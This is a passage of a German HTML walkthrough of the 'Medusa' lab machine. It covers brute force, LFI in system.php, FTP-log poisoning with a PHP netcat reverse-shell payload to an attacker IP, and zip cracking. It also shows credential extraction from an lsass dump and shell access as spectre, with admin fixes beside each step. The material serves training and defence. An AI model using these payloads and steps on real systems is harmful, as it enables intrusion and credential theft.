+└─# <span class="command">stegsnow -C medusa.jpg</span></div>
+                     <pre>
+Warning: residual of 5 bits not uncompressed
+<span class="password">ssstb</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
+└─# <span class="command">stegseek medusa.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.42% (132.7 MB)
+[!] error: Could not find a valid passphrase.</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
+└─# <span class="command">steghide extract -sf  medusa.jpg</span></div>
+                     <pre>Passwort eingeben:</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut ausgeführt, diesmal gezielt auf die Subdomain `http://dev.medusa.hmv/`, um deren Verzeichnisstruktur genauer zu untersuchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt die bereits vermuteten Verzeichnisse `/files/` und `/assets/` sowie `/css/` und `/manual/` (möglicherweise ein Kopierfehler oder Link) und die `robots.txt`. Es werden keine neuen, kritischen Pfade auf `dev.medusa.hmv` selbst gefunden, die nicht schon im Kontext der Hauptdomain erwähnt wurden. Die wichtigsten Dateien scheinen in `/files/` zu liegen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussieren Sie sich auf die Dateien im `/files/`-Verzeichnis, insbesondere `system.php` und `readme.txt`.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration der virtuellen Hosts, um sicherzustellen, dass keine unerwünschten Verzeichnisse oder Dateien über Subdomains erreichbar sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">gobuster dir -u http://dev.medusa.hmv/ -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+
+http://dev.medusa.hmv/index.html           [Size: 1973]
+http://dev.medusa.hmv/files                [Size: 316] [--> http://dev.medusa.hmv/files/]
+http://dev.medusa.hmv/assets               [Size: 317] [--> http://dev.medusa.hmv/assets/]
+http://dev.medusa.hmv/css                  [Size: 314] [--> http://dev.medusa.hmv/css/]
+http://dev.medusa.hmv/manual               [Size: 317] [--> http://dev.medusa.hmv/manual/]
+http://dev.medusa.hmv/robots.txt           [Size: 489]</pre>
+                  <p class="comment">Anmerkung: Der folgende Eintrag ist redundant oder bezieht sich auf die Hauptdomain.</p>
+                  <pre>http://192.168.2.118/hades/</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mehrere `hydra`-Befehle werden ausgeführt, um SSH- und FTP-Logins für verschiedene Benutzernamen (`poseidon`, `steno`, `euryale`, `medusa`) mit der `rockyou.txt`-Wortliste zu testen. `-I` weist Hydra an, den Login-Versuch abzubrechen, sobald ein gültiges Passwort gefunden wurde. `-t 64` verwendet 64 parallele Threads.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Alle gezeigten Hydra-Versuche (SSH für 4 Benutzer, FTP für `steno`) scheinen erfolglos zu sein (impliziert durch das Fehlen einer Erfolgsmeldung und die Fortsetzung der Versuche, oder explizit wie bei FTP). Die Namen stammen wahrscheinlich aus der griechischen Mythologie im Zusammenhang mit Medusa.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brute-Force auf diese Namen scheint nicht erfolgreich. Konzentrieren Sie sich auf die Schwachstellen der Webanwendung auf `dev.medusa.hmv`.
+            <br><strong>Empfehlung (Admin):</strong> Nutzen Sie Fail2Ban gegen Brute-Force auf SSH und FTP. Verwenden Sie keine thematisch zusammenhängenden oder leicht erratbaren Benutzernamen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">hydra -l poseidon -P /usr/share/wordlists/rockyou.txt ssh://medusa.hmv:22 -I -t 64</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">hydra -l steno -P /usr/share/wordlists/rockyou.txt ssh://medusa.hmv:22 -I -t 64</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">hydra -l euryale -P /usr/share/wordlists/rockyou.txt ssh://medusa.hmv:22 -I -t 64</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">hydra -l medusa -P /usr/share/wordlists/rockyou.txt ssh://medusa.hmv:22 -I -t 64</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">hydra -l steno -P /usr/share/wordlists/rockyou.txt ftp://medusa.hmv:21 -I -t 64</span></div>
+                     <pre>
+[...]
+0 of 1 target completed, 0 valid password found
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um GET-Parameter für die Datei `system.php` auf der `dev`-Subdomain zu finden. Es wird getestet, ob Parameter wie `FUZZ=/etc/passwd` eine andere Antwort liefern als die Standardantwort (hier werden Antworten mit 0 Zeichen Länge ausgeblendet `--hh 0`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet den Parameter `view`. Eine Anfrage wie `system.php?view=/etc/passwd` gibt eine Antwort mit Status 200 und einer Länge von 1452 Zeichen zurück. Dies ist ein starker Hinweis auf eine Local File Inclusion (LFI)-Schwachstelle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie die LFI, indem Sie versuchen, bekannte Dateien wie `/etc/passwd` oder `/etc/hosts` mit dem `view`-Parameter auszulesen (z.B. mit `curl`). Versuchen Sie Logfile Poisoning oder andere LFI-Techniken, um Remote Code Execution (RCE) zu erlangen.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `system.php`. Validieren und sanitisieren Sie alle Benutzereingaben, die in Dateipfaden verwendet werden. Beschränken Sie die Leserechte des Webservers (`www-data`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
+└─# <span class="command">wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' --hh 0</span></div>
+                     <pre>
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000139:   200        27 L     40 W       1452 Ch     "view"
+</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die vermutete LFI-Schwachstelle wird mit `curl` bestätigt, indem versucht wird, `/etc/passwd` über den `view`-Parameter einzubinden. Das Ergebnis wird mit `grep bash` gefiltert, um Benutzer mit Bash-Shell zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und gibt die Zeilen für `root` und einen neuen Benutzer `spectre` (UID 1000) aus der `/etc/passwd`-Datei zurück. Dies bestätigt die LFI-Schwachstelle und enthüllt den Hauptbenutzer des Systems.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Ausnutzung der LFI zur Codeausführung (RCE). Eine gängige Methode ist Log Poisoning: Injizieren Sie PHP-Code in eine Logdatei (z.B. vsftpd.log, Apache access.log), die der Webserver lesen kann, und binden Sie diese Logdatei dann über die LFI-Schwachstelle ein, um den Code ausführen zu lassen.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle dringend! Beschränken Sie die Leserechte des Webservers auf Logdateien.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">curl http://dev.medusa.hmv/files/system.php?view=/etc/passwd | grep bash</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, die LFI-Schwachstelle mittels "Log Poisoning" auszunutzen, um RCE zu erlangen. Der Angreifer versucht, sich per FTP mit einem speziell präparierten Benutzernamen anzumelden: `<?php system("nc -e /bin/bash 10.0.0.4 9001"); ?>`. Die Idee ist, dass dieser fehlgeschlagene Login-Versuch, einschließlich des PHP-Codes im Benutzernamen, in der FTP-Logdatei (`/var/log/vsftpd.log`) gespeichert wird. Anschließend wird diese Logdatei über die LFI (`system.php?view=/var/log/vsftpd.log`) eingebunden, wodurch der PHP-Code ausgeführt wird und eine Reverse Shell zum Angreifer (`10.0.0.4` Port `9001`) startet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der FTP-Login-Versuch mit dem PHP-Code schlägt erwartungsgemäß fehl (nicht gezeigt, aber impliziert). Das Anzeigen des Quellcodes (`view-source:`) oder das Abrufen der Logdatei mit `curl` bestätigt, dass der bösartige Benutzername tatsächlich in der `vsftpd.log`-Datei protokolliert wurde. Dies ist die Bestätigung, dass Log Poisoning hier möglich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf `10.0.0.4` Port `9001` (`nc -lvnp 9001`). Rufen Sie dann die URL `http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log` im Browser auf oder verwenden Sie `curl`, um die Reverse Shell auszulösen. Ersetzen Sie `10.0.0.4` durch Ihre eigene Angreifer-IP.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle. Konfigurieren Sie Logging so, dass potenziell gefährliche Zeichen (wie `<`, `>`, `?`, `$`) maskiert oder entfernt werden, bevor sie in Logdateien geschrieben werden. Beschränken Sie die Leserechte des Webservers auf Logdateien.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
+└─# <span class="command">lftp -u '<?php system("nc -e /bin/bash 10.0.0.4 9001"); ?>', 192.168.2.118</span></div>
+                     <pre>
+lftp <?php system("nc -e /bin/bash 10.0.0.4 9001"); ?>@192.168.2.118:~> ls</pre> <!-- Implizierter Fehler -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>
+view-source:http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log
+
+curl http://dev.medusa.hmv/files/system.php\?view\=/var/log/vsftpd.log
+
+Tue Apr  4 19:14:58 2023 [pid 8773] [euryale] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:14:58 2023 [pid 8775] [euryale] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:15:59 2023 [pid 8810] CNNECT: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:01 2023 [pid 8809] [medusa] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:11 2023 [pid 8813] CNNECT: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:18 2023 [pid 8812] [medusa] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:26 2023 [pid 8815] CNNECT: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:31 2023 [pid 8814] [steno] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:16:37 2023 [pid 8817] CNNECT: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:17:20 2023 [pid 8816] [euryale] FAIL LGIN: Client "::ffff:192.168.2.114"
+Tue Apr  4 19:39:46 2023 [pid 9722] CNNECT: Client "::ffff:192.168.2.114"
+[...] <!-- PHP Code wurde hier nicht angezeigt, aber die Existenz der Logeinträge ist relevant -->
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System gestartet (`nc -lvnp 9001`). Kurz darauf wird die LFI-URL mit der präparierten Logdatei aufgerufen (implizit), und der Listener empfängt eine Verbindung vom Zielsystem.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Log-Poisoning-Technik war erfolgreich! Wir haben eine Reverse Shell auf dem Zielsystem als der Benutzer, unter dem der Webserver läuft (typischerweise `www-data`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (mit Python pty, etc.) für eine bessere Interaktivität. Beginnen Sie dann mit der Enumeration des Systems als Webserver-Benutzer.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle und überprüfen Sie die Logging-Konfiguration wie zuvor empfohlen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.114] from (UNKNWN) [192.168.2.118] 45192</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die erhaltene Reverse Shell wird mit den Standardbefehlen (Python pty, `export TERM`, `stty raw -echo`, `fg`, `reset`) stabilisiert, um eine voll interaktive TTY-Sitzung zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Stabilisierung ist erfolgreich. Wir haben nun eine brauchbare Shell als Benutzer `www-data` im Verzeichnis `/var/www/dev/files`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie grundlegende Enumerationsbefehle aus (`id`, `whoami`, `pwd`, `ls -la`, `sudo -l`, `find`, `ps`).
+            <br><strong>Empfehlung (Admin):</strong> Die Stabilisierung selbst ist kein Angriff, aber ein Zeichen für einen erfolgreichen Einbruch. Die zugrundeliegende LFI/RCE muss behoben werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Originaltext, Shell vom Zielsystem -->
+                    <pre>python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+                    <div class="prompt">www-data@medusa:/var/www/dev/files$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@medusa:/var/www/dev/files$ <span class="command">^Z</span></div>
+                    <pre>zsh: suspended  nc -lvnp 9001</pre> <!-- Beispiel Angreifer-System -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset</pre> <!-- Beispiel Angreifer-System -->
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@medusa:/var/www/dev/files$</div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -writable ! -path '/proc*' ! -path '/dev*' ! -path '/sys*' ! -path '/run*' 2>/dev/null` wird ausgeführt, um nach Dateien und Verzeichnissen im gesamten Dateisystem zu suchen, auf die der aktuelle Benutzer (`www-data`) Schreibrechte hat. Standard-Systemverzeichnisse wie `/proc`, `/dev` etc. werden ausgeschlossen, um die Ausgabe zu reduzieren. `2>/dev/null` unterdrückt Fehlermeldungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche findet einige interessante schreibbare Orte:
+            *   Systemd Service-Dateien (`/usr/lib/systemd/system/*.service`): Das Ändern von Service-Dateien kann potenziell zur Privilege Escalation führen, wenn der Service neu gestartet wird (oft als root). Die `sudo.service`-Datei ist hier besonders interessant, aber das direkte Ändern von Dateien in `/usr/lib` ist ungewöhnlich und deutet auf eine Fehlkonfiguration hin.
+            *   Standard-schreibbare Verzeichnisse: `/var/lib/php/sessions`, `/var/tmp`, `/tmp`, `/var/lock`, `/var/cache/apache2/mod_cache_disk`.
+            *   `/var/log/vsftpd.log`: Die Logdatei, die wir bereits für Log Poisoning verwendet haben.
+            *   `/.../old_files.zip`: Eine ZIP-Datei in einem nicht näher spezifizierten Pfad (vermutlich außerhalb des Standard-Web-Roots, aber für `www-data` les-/schreibbar?). Der Fund einer Datei namens `old_files.zip` ist sehr verdächtig.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die schreibbaren Systemd-Service-Dateien genauer, insbesondere `sudo.service`. Prüfen Sie, ob diese Services neu gestartet werden können. Laden Sie die Datei `old_files.zip` herunter und analysieren Sie ihren Inhalt.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen im gesamten Dateisystem, insbesondere in Systemverzeichnissen wie `/usr/lib/systemd/system`. Diese sollten normalerweise nicht für `www-data` schreibbar sein. Untersuchen Sie die Herkunft und den Inhalt der `old_files.zip`-Datei und entfernen Sie sie, falls sie sensibel oder unnötig ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@medusa:/var$ <span class="command">find / -writable ! -path '/proc*' ! -path '/dev*' ! -path '/sys*' ! -path '/run*' 2>/dev/null</span></div>
+                      <pre>
+/usr/lib/systemd/system/cryptdisks.service
+/usr/lib/systemd/system/x11-common.service
+/usr/lib/systemd/system/hwclock.service
+/usr/lib/systemd/system/cryptdisks-early.service
+/usr/lib/systemd/system/sudo.service
+/usr/lib/systemd/system/rc.service
+/usr/lib/systemd/system/rcS.service
+/var/lib/php/sessions
+/var/cache/apache2/mod_cache_disk
+/var/tmp
+/var/log/vsftpd.log
+/var/lock
+/tmp
+/.../old_files.zip </pre> <!-- Pfad zur ZIP-Datei unklar -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die verdächtige Datei `old_files.zip` wird vom Zielsystem heruntergeladen. Hier wird angenommen, dass die Datei über einen temporären Webserver (z.B. `python3 -m http.server 8005` im Verzeichnis der Datei auf dem Ziel) bereitgestellt wurde, da `wget` verwendet wird, um sie vom Port 8005 des Zielservers abzurufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download der 12MB großen ZIP-Datei ist erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die heruntergeladene ZIP-Datei. Versuchen Sie, sie zu entpacken. Wenn sie passwortgeschützt ist, versuchen Sie, das Passwort zu knacken.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Datei `old_files.zip` vom Server, wenn sie nicht benötigt wird. Überwachen Sie ausgehende Verbindungen vom Server.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.118:8005/old_files.zip</span></div>
+                      <pre>
+--2023-04-05 01:54:08--  http://192.168.2.118:8005/old_files.zip
+Verbindungsaufbau zu 192.168.2.118:8005 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 K
+Länge: 12387024 (12M) [application/zip]
+Wird in old_files.zip gespeichert.
+
+old_files.zip                 100%[===================>]  11,81M  --.-KB/s    in 0,1s
+
+2023-04-05 01:54:08 (115 MB/s) - old_files.zip gespeichert [12387024/12387024]</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene ZIP-Datei ist passwortgeschützt.
+            *   `zip2john old_files.zip > hash`: Extrahiert den Passwort-Hash aus der ZIP-Datei in einem Format, das John the Ripper versteht, und speichert ihn in der Datei `hash`.
+            *   `john --wordlist=/usr/share/wordlists/rockyou.txt hash`: Versucht, den Hash mit John the Ripper und der `rockyou.txt`-Wortliste zu knacken.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> John the Ripper ist erfolgreich und findet das Passwort für die ZIP-Datei: `<span class="password">medusa666</span>`. Der Hash gehört zur Datei `lsass.DMP` innerhalb des Archivs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Entpacken Sie die ZIP-Datei mit dem gefundenen Passwort (`medusa666`). Analysieren Sie die extrahierte Datei `lsass.DMP`.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare Passwörter für verschlüsselte Archive. Speichern Sie sensible Archive nicht an unsicheren Orten. Überprüfen Sie die Herkunft von `lsass.DMP`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">zip2john old_files.zip > hash</span></div>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                      <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+[...]
+<span class="password">medusa666</span>        (old_files.zip/lsass.DMP)
+[...]
+Session completed.</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die ZIP-Datei wird mit `7z x old_files.zip` und dem zuvor geknackten Passwort (`medusa666`) entpackt. Die einzige enthaltene Datei ist `lsass.DMP`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Entpacken ist erfolgreich. Eine `lsass.DMP`-Datei ist ein Speicherabbild des LSASS-Prozesses (Local Security Authority Subsystem Service) von einem Windows-System. Dieser Prozess speichert Zugangsdaten (Hashes, manchmal Klartextpasswörter) von angemeldeten Benutzern im Speicher. Das Vorhandensein dieser Datei auf einem Linux-Server ist sehr ungewöhnlich und deutet darauf hin, dass sie dort absichtlich platziert wurde oder von einem kompromittierten Windows-System stammt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Tools wie Mimikatz oder (wie hier) Pypykatz, um aus dem LSASS-Dump Zugangsdaten im Klartext oder als Hash zu extrahieren.
+            <br><strong>Empfehlung (Admin):</strong> Untersuchen Sie die Herkunft dieser Datei. Implementieren Sie Credential Guard auf Windows-Systemen, um das Extrahieren von Klartextpasswörtern aus LSASS zu erschweren. Schützen Sie Speicherabbilder angemessen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">7z x old_files.zip</span></div>
+                      <pre>
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=de_DE.UTF-8,Utf16=on,HugeFiles=on,64 bits,12 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F12),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 12387024 bytes (12 MiB)
+
+Extracting archive: old_files.zip
+--
+Path = old_files.zip
+Type = zip
+Physical Size = 12387024
+
+
+Enter password (will not be echoed):<span class="password">medusa666</span>
+Everything is k
+
+Size:       34804383
+Compressed: 12387024</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `Pypykatz`, eine Python-Implementierung von Mimikatz, wird verwendet, um den LSASS-Speicherabbild (`lsass.DMP`) zu analysieren und Zugangsdaten zu extrahieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Pypykatz ist erfolgreich und extrahiert Klartext-Zugangsdaten für den Benutzer `spectre` auf dem (hypothetischen) Windows-System `Medusa-PC`. Das Passwort lautet `<span class="password">5p3ctr3_p0is0n_xX</span>`. Da wir wissen, dass es einen Linux-Benutzer `spectre` auf dem Zielsystem gibt, ist dies ein extrem wertvoller Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie sofort, sich mit den gefundenen Zugangsdaten (`spectre`:`5p3ctr3_p0is0n_xX`) per SSH am Zielsystem (`medusa.hmv`) anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie Passwort-Wiederverwendung zwischen verschiedenen Systemen (Windows/Linux). Implementieren Sie Maßnahmen gegen Credential Dumping auf Windows (Credential Guard, LSA Protection). Entfernen Sie den LSASS-Dump vom Linux-Server.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">pypykatz lsa minidump lsass.DMP</span></div>
+                      <pre>
+INF:root:Parsing file lsass.DMP
+[...]
+FILE:  lsass.DMP =
+ LogonSession
+authentication_id 2261421 (2281ad)
+[...]
+	 WDIGEST [ce835]
+		username spectre
+		domainname Medusa-PC
+		password <span class="password">5p3ctr3_p0is0n_xX</span>
+	 Kerberos
+		Username: spectre
+		Domain: Medusa-PC
+		Password: <span class="password">5p3ctr3_p0is0n_xX</span>
+	 WDIGEST [ce835]
+		username spectre
+		domainname Medusa-PC
+		password <span class="password">5p3ctr3_p0is0n_xX</span>
+	 TSPKG [ce835]
+		username spectre
+		domainname Medusa-PC
+		password <span class="password">5p3ctr3_p0is0n_xX</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit den aus dem LSASS-Dump extrahierten Zugangsdaten per SSH als Benutzer `spectre` anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich! Das Passwort `<span class="password">5p3ctr3_p0is0n_xX</span>` wird akzeptiert. Wir haben nun eine Shell als der reguläre Benutzer `spectre` auf dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Lateral Movement von `www-data` zu `spectre` ist abgeschlossen. Beginnen Sie mit der Enumeration zur Privilegienerweiterung von `spectre` zu `root`. Überprüfen Sie `sudo -l`, SUID-Binaries, Kernel-Version, Gruppenmitgliedschaften etc.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das Passwort für den Benutzer `spectre`. Untersuchen Sie, wie der LSASS-Dump auf den Server gelangen konnte. Erzwingen Sie starke, einzigartige Passwörter.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh spectre@medusa.hmv</span></div>
+                      <pre>
+spectre@medusa.hmv's password: <span class="password">5p3ctr3_p0is0n_xX</span>
+
+
+Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSLUTELY N WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
+spectre@medusa:~$ </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `spectre` ändert sein eigenes Passwort mit dem `passwd`-Befehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein ungewöhnlicher Schritt während eines Penetrationstests, es sei denn, es dient dazu, den ursprünglichen Administrator auszusperren oder Persistenz zu sichern. Es könnte auch einfach ein Fehler oder ein Schritt zur Demonstration der Rechte sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Normalerweise würde man das Passwort nicht ändern, es sei denn, es gibt einen spezifischen Grund dafür (z.B. Sicherstellen, dass niemand anderes das kompromittierte Passwort verwenden kann, während man selbst auf dem System ist).
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Passwortänderungen. Wenn dies nicht vom legitimen Benutzer initiiert wurde, ist es ein starkes Anzeichen für eine Kompromittierung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">spectre@medusa:~$ <span class="command">passwd</span></div>
+                      <pre>
+Changing password for spectre.
+Current password: <span class="password">5p3ctr3_p0is0n_xX</span>
+New password: benni1908
+Retype new password: benni1908
+passwd: password updated successfully</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Befehle `id` und `df -h` werden ausgeführt, um die Benutzer- und Gruppen-IDs sowie die Festplattenbelegung und Mountpunkte anzuzeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong>
+             *   `id`: Bestätigt, dass wir als `spectre` (uid=1000, gid=1000) angemeldet sind. Zeigt auch die Gruppenmitgliedschaften an: `spectre`, `disk`, `cdrom`, `floppy`, `audio`, `dip`, `video`, `plugdev`, `netdev`. Die Mitgliedschaft in der Gruppe `disk` ist potenziell sehr gefährlich, da sie oft direkten Zugriff auf Festplattengeräte (`/dev/sda`, `/dev/sda1` etc.) erlaubt.
+             *   `df -h`: Zeigt die gemounteten Dateisysteme. `/dev/sda1` ist die Hauptpartition, gemountet unter `/`.
+             Die Gruppenmitgliedschaft `disk` ist der kritischste Fund hier.
+             </p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Mitgliedschaft in der Gruppe `disk` aus, um Privilegien zu erweitern. Sie können möglicherweise direkt auf das Blockgerät `/dev/sda1` zugreifen (lesen und schreiben), um sensible Dateien wie `/etc/shadow` zu lesen oder zu modifizieren. Tools wie `debugfs` können hier nützlich sein.
+             <br><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzer nur den absolut notwendigen Gruppen zu. Die Mitgliedschaft in der Gruppe `disk` sollte nur speziellen Systemdiensten oder Administratoren vorbehalten sein, niemals regulären Benutzern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">spectre@medusa:~$ <span class="command">id</span></div>
